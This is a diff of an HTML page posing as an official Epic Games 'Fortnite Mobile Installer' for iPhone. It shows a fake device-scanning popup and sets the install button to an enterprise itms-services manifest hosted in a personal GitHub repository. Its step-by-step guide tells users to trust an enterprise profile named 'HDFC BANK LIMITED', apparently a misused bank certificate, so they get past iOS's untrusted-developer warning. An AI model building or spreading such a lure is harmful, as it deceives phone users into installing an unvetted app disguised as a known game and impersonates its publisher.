@@ -1,411 +1,401 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Install Fortnite on your iPhone with step-by-step guide">
-    <title>Fortnite Install</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Install Fortnite on your iPhone with step-by-step guide">
+  <title>Fortnite Install</title>
 
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebPage",
+    "name": "Fortnite Installation",
+    "description": "Step-by-step guide to installing Fortnite on your iPhone.",
+    "publisher": {
+      "@type": "Organization",
+      "name": "Epic Games"
+    },
+    "mainEntityOfPage": {
       "@type": "WebPage",
-      "name": "Fortnite Installation",
-      "description": "Step-by-step guide to installing Fortnite on your iPhone.",
-      "publisher": {
-        "@type": "Organization",
-        "name": "Epic Games"
-      },
-      "mainEntityOfPage": {
-        "@type": "WebPage",
-        "@id": "https://example.com/fortnite-install"
-      }
+      "@id": "https://example.com/fortnite-install"
     }
-    </script>
+  }
+  </script>
 
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f7f7f7;
-            color: #121212;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
-        .header-container {
-            position: relative;
-            width: 100%;
-            max-height: 300px;
-            overflow: hidden;
-        }
-        .header-image {
-            width: 100%;
-            height: auto;
-            object-fit: cover;
-            display: block;
-        }
-        .header-text {
-            position: absolute;
-            top: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: white;
-            font-size: 2em;
-            font-weight: bold;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
-            z-index: 10;
-        }
-        .logo-container {
-            background-color: #f7f7f7;
-            padding: 20px 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .fortnite-logo {
-            width: 150px;
-            height: auto;
-        }
-        .install-button-container {
-            padding: 20px;
-            text-align: center;
-        }
-        #installButton {
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            padding: 12px 20px;
-            background: #333333;
-            color: #ffffff;
-            font-size: 15px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            text-decoration: none;
-            border-radius: 4px;
-            border: 1px solid #2c2c2c;
-            box-shadow: inset 0 0 0 1px #2c2c2c;
-            transition: background 0.2s ease, transform 0.1s ease-in-out;
-            -webkit-tap-highlight-color: transparent;
-        }
-        #notSupportedButton {
-            display: inline-block;
-            padding: 12px 20px;
-            background: #8b0000;
-            color: #ffffff;
-            font-size: 15px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            text-decoration: none;
-            border-radius: 4px;
-            border: 1px solid #700000;
-            box-shadow: inset 0 0 0 1px #700000;
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #3498db;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg);}
-            100% { transform: rotate(360deg);}
-        }
-        .popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: #ffffff;
-            color: #121212;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 10px rgba(0,0,0,0.2);
-            text-align: center;
-            z-index: 9999;
-        }
-        .popup.active {
-            display: block;
-        }
-        .installation-guide {
-            background: #ffffff;
-            max-width: 700px;
-            margin: 20px auto;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        .guide-title {
-            text-align: center;
-            color: #4a5fc1;
-            margin-bottom: 20px;
-            font-size: 2rem;
-        }
-        .progress-container {
-            background: #e0e0e0;
-            border-radius: 30px;
-            height: 12px;
-            width: 100%;
-            margin-bottom: 10px;
-            overflow: hidden;
-            position: relative;
-        }
-        .progress-bar {
-            background: #4a5fc1;
-            height: 100%;
-            width: 0%;
-            transition: width 0.4s ease;
-        }
-        .step-counter {
-            text-align: center;
-            color: #666;
-            margin-bottom: 20px;
-            font-weight: bold;
-        }
-        .step {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-            animation: fadeIn 0.6s ease-in-out;
-        }
-        .step.active {
-            display: flex;
-        }
-        .step img {
-            max-width: 100%;
-            border-radius: 8px;
-            margin-bottom: 15px;
-        }
-        .step p {
-            font-size: 16px;
-            margin-bottom: 15px;
-        }
-        .step b {
-            color: #4a5fc1;
-        }
-        .buttons {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 20px;
-        }
-        .buttons button {
-            background: #4a5fc1;
-            color: #fff;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background 0.3s ease;
-        }
-        .buttons button:hover {
-            background: #3a4db3;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .copyright {
-            margin-top: auto;
-            padding: 20px 0;
-            font-size: 0.9em;
-            color: #666;
-        }
-    </style>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #000000;
+      color: #ffffff;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .header-container {
+      position: relative;
+      width: 100%;
+      max-height: 300px;
+      overflow: hidden;
+    }
+    .header-image {
+      width: 100%;
+      height: auto;
+      object-fit: cover;
+      display: block;
+    }
+    .header-text {
+      position: absolute;
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: white;
+      font-size: 2em;
+      font-weight: bold;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
+      z-index: 10;
+    }
+    .logo-container {
+      background-color: #000000;
+      padding: 20px 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .fortnite-logo {
+      width: 150px;
+      height: auto;
+    }
+    .install-button-container {
+      padding: 20px;
+      text-align: center;
+    }
+    #installButton {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 20px;
+      background: #333333;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      text-decoration: none;
+      border-radius: 4px;
+      border: 1px solid #2c2c2c;
+      box-shadow: inset 0 0 0 1px #2c2c2c;
+      transition: background 0.2s ease, transform 0.1s ease-in-out;
+      -webkit-tap-highlight-color: transparent;
+    }
+    #notSupportedButton {
+      display: inline-block;
+      padding: 12px 20px;
+      background: #8b0000;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      text-decoration: none;
+      border-radius: 4px;
+      border: 1px solid #700000;
+      box-shadow: inset 0 0 0 1px #700000;
+    }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #1a1a1a;
+      color: #ffffff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.1);
+      text-align: center;
+      z-index: 9999;
+    }
+    .popup.active {
+      display: block;
+    }
+    .installation-guide {
+      background: #000000;
+      color: #ffffff;
+      max-width: 700px;
+      margin: 20px auto;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+    }
+    .guide-title {
+      text-align: center;
+      color: #b84dff;
+      margin-bottom: 20px;
+      font-size: 2rem;
+    }
+    .progress-container {
+      background: #e0e0e0;
+      border-radius: 30px;
+      height: 12px;
+      width: 100%;
+      margin-bottom: 10px;
+      overflow: hidden;
+      position: relative;
+    }
+    .progress-bar {
+      background: #b84dff;
+      height: 100%;
+      width: 0%;
+      transition: width 0.4s ease;
+    }
+    .step-counter {
+      text-align: center;
+      color: #aaaaaa;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+    .step {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      animation: fadeIn 0.6s ease-in-out;
+    }
+    .step.active {
+      display: flex;
+    }
+    .step img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin-bottom: 15px;
+    }
+    .step p {
+      font-size: 16px;
+      margin-bottom: 15px;
+      color: #ffffff;
+    }
+    .step b {
+      color: #b84dff;
+    }
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+    .buttons button {
+      background: #b84dff;
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .buttons button:hover {
+      background: #a03ccf;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .copyright {
+      margin-top: auto;
+      padding: 20px 0;
+      font-size: 0.9em;
+      color: #666;
+    }
+  </style>
 </head>
 <body>
 
-    <div class="header-container">
-        <img src="https://cdn2.unrealengine.com/ogc1s3-1920x1080-181f9f4e8a8e.jpg" alt="Fortnite Header" class="header-image">
-        <div class="header-text">FORTNITE MOBILE INSTALLER</div>
+  <div class="header-container">
+    <img src="https://cdn2.unrealengine.com/ogc1s3-1920x1080-181f9f4e8a8e.jpg" alt="Fortnite Header" class="header-image">
+    <div class="header-text">FORTNITE MOBILE INSTALLER</div>
+  </div>
+
+  <div class="logo-container">
+    <img src="https://crystalpng.com/wp-content/uploads/2024/09/Fortnite-logo-png.png" alt="Fortnite Logo" class="fortnite-logo">
+  </div>
+
+  <div class="install-button-container">
+    <a id="installButton" href="#" rel="noopener">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/Epic_Games_logo.svg/64px-Epic_Games_logo.svg.png" alt="Epic Games" width="24" height="24" style="display:inline-block; vertical-align: middle;">
+      <span id="buttonText" style="vertical-align: middle;">SCANNING DEVICE...</span>
+    </a>
+    <a id="notSupportedButton" href="#" style="display: none; margin-top: 10px;">
+      NOT ON IPHONE/IPAD
+    </a>
+  </div>
+
+  <div id="popup" class="popup">
+    <p>Scanning your device...</p>
+    <div class="spinner"></div>
+  </div>
+
+  <div class="installation-guide">
+    <h2 class="guide-title">Fortnite Installation Guide</h2>
+    <div class="progress-container">
+      <div class="progress-bar" id="progressBarGuide"></div>
     </div>
+    <div class="step-counter" id="stepCounterGuide">Step 1 of 6</div>
 
-    <div class="logo-container">
-        <img src="https://crystalpng.com/wp-content/uploads/2024/09/Fortnite-logo-png.png" alt="Fortnite Logo" class="fortnite-logo">
+    <div class="container" id="stepsContainer">
+      <div class="step active">
+        <img src="https://i.ibb.co/YK2Y65M/2.jpg" alt="Fortnite Downloaded">
+        <p>After downloading, Fortnite should appear installed on your device. A few more steps are needed to launch it!</p>
+      </div>
+      <div class="step">
+        <img src="https://i.ibb.co/PZ2qpZQ3/3.jpg" alt="Untrusted Developer Message">
+        <p>When you open Fortnite, a warning might appear because it's not from the App Store.</p>
+      </div>
+      <div class="step">
+        <img src="https://i.ibb.co/xWrLq1x/4.jpg" alt="Settings VPN Management">
+        <p>Open <b>Settings &gt; General &gt; VPN &amp; Device Management</b> on your iPhone.</p>
+      </div>
+      <div class="step">
+        <img src="https://i.ibb.co/84YSwHqG/5.jpg" alt="Enterprise App Profile">
+        <p>Tap the Fortnite profile under <b>Enterprise Apps</b> to view more options.</p>
+      </div>
+      <div class="step">
+        <img src="https://i.ibb.co/Rfcx3Qb/7.jpg" alt="Trust HDFC Bank Limited">
+        <p>Tap <b>Trust "HDFC BANK LIMITED"</b> and confirm it.</p>
+      </div>
+      <div class="step">
+        <img src="https://i.ibb.co/7JTbSwTC/8.jpg" alt="Allow and Restart">
+        <p>Tap <b>Allow</b> when prompted. Your phone will restart — after that, Fortnite will be ready to play!</p>
+      </div>
+
+      <div class="buttons">
+        <button id="prevBtnGuide">Back</button>
+        <button id="nextBtnGuide">Next</button>
+      </div>
     </div>
+  </div>
 
-    <div class="install-button-container">
-        <a id="installButton" href="#" rel="noopener">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/Epic_Games_logo.svg/64px-Epic_Games_logo.svg.png" alt="Epic Games" width="24" height="24" style="display:inline-block; vertical-align: middle;">
-            <span id="buttonText" style="vertical-align: middle;">SCANNING DEVICE...</span>
-        </a>
-        <a id="notSupportedButton" href="#" style="display: none; margin-top: 10px;">
-            NOT ON IPHONE/IPAD
-        </a>
-    </div>
+  <div class="copyright">
+    &copy; Fortnite IPAs 2025
+  </div>
 
-    <div id="popup" class="popup">
-        <p>Scanning your device...</p>
-        <div class="spinner"></div>
-    </div>
+  <script>
+    const installButton = document.getElementById('installButton');
+    const notSupportedButton = document.getElementById('notSupportedButton');
+    const buttonText = document.getElementById('buttonText');
+    const popup = document.getElementById('popup');
 
-    <div class="installation-guide">
-        <h2 class="guide-title">Fortnite Installation Guide</h2>
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBarGuide"></div>
-        </div>
-        <div class="step-counter" id="stepCounterGuide">Step 1 of 6</div>
+    function showPopup(message, spinner = false) {
+      popup.innerHTML = `<p>${message}</p>${spinner ? '<div class="spinner"></div>' : ''}`;
+      popup.classList.add('active');
+    }
 
-        <div class="container" id="stepsContainer">
-            <div class="step active">
-                <img src="https://i.ibb.co/YK2Y65M/2.jpg" alt="Fortnite Downloaded">
-                <p>After downloading, Fortnite should appear installed on your device. A few more steps are needed to launch it!</p>
-            </div>
+    function hidePopup() {
+      popup.classList.remove('active');
+    }
 
-            <div class="step">
-                <img src="https://i.ibb.co/PZ2qpZQ3/3.jpg" alt="Untrusted Developer Message">
-                <p>When you open Fortnite, a warning might appear because it's not from the App Store.</p>
-            </div>
+    showPopup('Scanning your device...', true);
 
-            <div class="step">
-                <img src="https://i.ibb.co/xWrLq1x/4.jpg" alt="Settings VPN Management">
-                <p>Open <b>Settings &gt; General &gt; VPN &amp; Device Management</b> on your iPhone.</p>
-            </div>
+    setTimeout(() => {
+      const userAgent = navigator.userAgent;
+      const isApple = /iPhone|iPad|iPod/i.test(userAgent);
 
-            <div class="step">
-                <img src="https://i.ibb.co/84YSwHqG/5.jpg" alt="Enterprise App Profile">
-                <p>Tap the Fortnite profile under <b>Enterprise Apps</b> to view more options.</p>
-            </div>
+      let iosVersionMajor = 0;
+      let iosVersionMinor = 0;
+      const match = userAgent.match(/OS (\d+)_(\d+)_?/);
+      if (match) {
+        iosVersionMajor = parseInt(match[1]);
+        iosVersionMinor = parseInt(match[2]);
+      }
 
-            <div class="step">
-                <img src="https://i.ibb.co/Rfcx3Qb/7.jpg" alt="Trust HDFC Bank Limited">
-                <p>Tap <b>Trust "HDFC BANK LIMITED"</b> and confirm it.</p>
-            </div>
-
-            <div class="step">
-                <img src="https://i.ibb.co/7JTbSwTC/8.jpg" alt="Allow and Restart">
-                <p>Tap <b>Allow</b> when prompted. Your phone will restart — after that, Fortnite will be ready to play!</p>
-            </div>
-
-            <div class="buttons">
-                <button id="prevBtnGuide">Back</button>
-                <button id="nextBtnGuide">Next</button>
-            </div>
-        </div>
-    </div>
-
-    <div class="copyright">
-        @copyright Fortnite IPAs 2025
-    </div>
-
-    <script>
-        const installButton = document.getElementById('installButton');
-        const notSupportedButton = document.getElementById('notSupportedButton');
-        const buttonText = document.getElementById('buttonText');
-        const popup = document.getElementById('popup');
-
-        function showPopup(message, spinner = false) {
-            popup.innerHTML = `<p>${message}</p>${spinner ? '<div class="spinner"></div>' : ''}`;
-            popup.classList.add('active');
+      if (isApple) {
+        if (iosVersionMajor > 17 || (iosVersionMajor === 17 && iosVersionMinor >= 6)) {
+          showPopup('✅ Your device is supported!');
+          installButton.href = "itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/mrlychinebroo/fartnite/refs/heads/main/Instaal.plist";
+          buttonText.textContent = "INSTALL FORTNITE (v34.40)";
+          installButton.style.background = '#8000ff';
+          installButton.onclick = function () {
+            installButton.style.transform = 'scale(0.96)';
+            setTimeout(() => { installButton.style.transform = ''; }, 100);
+          };
+          notSupportedButton.style.display = 'none';
+          installButton.style.display = 'inline-flex';
+        } else {
+          showPopup('❌ Sorry, your iOS version is too low. Requires iOS 17.6 or higher.');
+          installButton.href = "#";
+          buttonText.textContent = "NOT SUPPORTED";
+          installButton.style.background = '#8b0000';
+          installButton.onclick = (e) => {
+            e.preventDefault();
+            alert("Your device does not meet the minimum iOS 17.6 requirement.");
+          };
+          installButton.style.display = 'inline-block';
+          notSupportedButton.style.display = 'none';
         }
+      } else {
+        showPopup('❌ Only iPhone or iPad are supported.');
+        installButton.style.display = 'none';
+        notSupportedButton.style.display = 'inline-block';
+        notSupportedButton.onclick = (e) => {
+          e.preventDefault();
+          alert("Only iPhone or iPad can download Fortnite Mobile.");
+        };
+      }
 
-        function hidePopup() {
-            popup.classList.remove('active');
-        }
+      setTimeout(hidePopup, 2500);
+    }, 1500);
 
-        // Start scanning popup
-        showPopup('Scanning your device...', true);
+    const stepsGuide = document.querySelectorAll('.step');
+    const nextBtnGuide = document.getElementById('nextBtnGuide');
+    const prevBtnGuide = document.getElementById('prevBtnGuide');
+    const progressBarGuide = document.getElementById('progressBarGuide');
+    const stepCounterGuide = document.getElementById('stepCounterGuide');
+    let currentStepGuide = 0;
 
-        // Delay for visual effect
-        setTimeout(() => {
-            const userAgent = navigator.userAgent;
-            const isApple = /iPhone|iPad|iPod/i.test(userAgent);
+    function showStepGuide(index) {
+      stepsGuide.forEach((step, i) => {
+        step.classList.toggle('active', i === index);
+      });
+      updateProgressGuide();
+    }
 
-            let iosVersionMajor = 0;
-            let iosVersionMinor = 0;
+    function updateProgressGuide() {
+      const progress = (currentStepGuide) / (stepsGuide.length - 1) * 100;
+      progressBarGuide.style.width = progress + "%";
+      stepCounterGuide.textContent = `Step ${currentStepGuide + 1} of ${stepsGuide.length}`;
+    }
 
-            const match = userAgent.match(/OS (\d+)_(\d+)_?/);
-            if (match) {
-                iosVersionMajor = parseInt(match[1]);
-                iosVersionMinor = parseInt(match[2]);
-            }
+    nextBtnGuide.addEventListener('click', () => {
+      if (currentStepGuide < stepsGuide.length - 1) {
+        currentStepGuide++;
+        showStepGuide(currentStepGuide);
+      }
+    });
 
-            console.log("Detected iOS Version:", iosVersionMajor, iosVersionMinor);
+    prevBtnGuide.addEventListener('click', () => {
+      if (currentStepGuide > 0) {
+        currentStepGuide--;
+        showStepGuide(currentStepGuide);
+      }
+    });
 
-            if (isApple) {
-                if (iosVersionMajor > 17 || (iosVersionMajor === 17 && iosVersionMinor >= 6)) {
-                    showPopup('✅ Your device is supported!');
-                    installButton.href = "itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/mrlychinebroo/fartnite/refs/heads/main/Instaal.plist";
-                    buttonText.textContent = "INSTALL FORTNITE (v34.40)";
-                    installButton.style.background = '#121212'; // Black button when ready
-                    installButton.onclick = function () {
-                        installButton.style.transform = 'scale(0.96)';
-                        setTimeout(() => { installButton.style.transform = ''; }, 100);
-                    };
-                    notSupportedButton.style.display = 'none';
-                    installButton.style.display = 'inline-flex';
-                } else {
-                    showPopup('❌ Sorry, your iOS version is too low. Requires iOS 17.6 or higher.');
-                    installButton.href = "#";
-                    buttonText.textContent = "NOT SUPPORTED";
-                    installButton.style.background = '#8b0000'; // Dark red
-                    installButton.onclick = (e) => {
-                        e.preventDefault();
-                        alert("Your device does not meet the minimum iOS 17.6 requirement.");
-                    };
-                    installButton.style.display = 'inline-block';
-                    notSupportedButton.style.display = 'none';
-                }
-            } else {
-                showPopup('❌ Only iPhone or iPad are supported.');
-                installButton.style.display = 'none';
-                notSupportedButton.style.display = 'inline-block';
-                notSupportedButton.onclick = (e) => {
-                    e.preventDefault();
-                    alert("Only iPhone or iPad can download Fortnite Mobile.");
-                };
-            }
-
-            setTimeout(hidePopup, 2500);
-
-        }, 1500);
-
-        const stepsGuide = document.querySelectorAll('.step');
-        const nextBtnGuide = document.getElementById('nextBtnGuide');
-        const prevBtnGuide = document.getElementById('prevBtnGuide');
-        const progressBarGuide = document.getElementById('progressBarGuide');
-        const stepCounterGuide = document.getElementById('stepCounterGuide');
-        let currentStepGuide = 0;
-
-        function showStepGuide(index) {
-            stepsGuide.forEach((step, i) => {
-                step.classList.toggle('active', i === index);
-            });
-            updateProgressGuide();
-        }
-
-        function updateProgressGuide() {
-            const progress = (currentStepGuide) / (stepsGuide.length - 1) * 100;
-            progressBarGuide.style.width = progress + "%";
-            stepCounterGuide.textContent = `Step ${currentStepGuide + 1} of ${stepsGuide.length}`;
-        }
-
-        nextBtnGuide.addEventListener('click', () => {
-            if (currentStepGuide < stepsGuide.length - 1) {
-                currentStepGuide++;
-                showStepGuide(currentStepGuide);
-            }
-        });
-
-        prevBtnGuide.addEventListener('click', () => {
-            if (currentStepGuide > 0) {
-                currentStepGuide--;
-                showStepGuide(currentStepGuide);
-            }
-        });
-
-        // Initialize guide
-        updateProgressGuide();
-    </script>
+    updateProgressGuide();
+  </script>
 
 </body>
 </html>
